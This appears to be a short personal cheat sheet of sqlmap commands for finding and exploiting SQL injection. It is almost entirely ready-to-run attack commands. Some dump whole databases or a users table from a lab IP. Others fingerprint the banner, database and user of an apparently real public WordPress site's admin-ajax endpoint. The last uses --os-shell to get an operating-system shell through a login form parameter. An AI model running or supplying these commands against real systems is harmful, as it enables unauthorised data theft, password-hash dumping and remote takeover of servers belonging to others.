> Detect and take advantage of SQL injection vulnerabilities in web applications. Once it detects one or more SQL injections on the target host, the user can choose among a variety of options to perform an extensive back-end database management system fingerprint, retrieve DBMS session user and database, enumerate users, password hashes, privileges, databases, dump entire or user’s specific DBMS tables/columns, run his own SQL statement, read specific files on the file system and more.


#SQL 

Running `sqlmap` specifying `user` as the vulnerable parameter
```bash
sqlmap -u http://192.168.69.169/blindsqli.php?user=1 -p user
```

Running `sqlmap` to dump the contents of the database tables if successful
```bash
sqlmap -u http://192.168.69.169/blindsqli.php?user=1 -p user --dump
```

Running `sqlmap` specifying the specific database table (`users`) to be dumped.
```bash
sqlmap -u http://192.168.69.169/blindsqli.php?user=1 -p user --dump -T users
```

Running `sqlmap` with higher levels and higher risk
```bash
sqlmap "http://hentai-convention.org/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" --level 5 --risk 3 --dump
```

Running `sqlmap` to get banner with `-b`
```bash
sqlmap "http://hentai-convention.org:80/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" -b
```

Running `sqlmap` to get current db
```bash
sqlmap "http://hentai-convention.org:80/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" --current-db
```

Running sqlmap to get current user
```bash
sqlmap "http://hentai-convention.org:80/wp-admin/admin-ajax.php?action=get_question&question_id=1 *" --current-user
```

#Shell_Access #Remote_Access

Running `sqlmap` to get shell
```bash
sqlmap --level 5 --risk 3 -r request.text -p ctl00%24ContentPlaceHolder1%24UsernameTextBox --os-shell --batch
```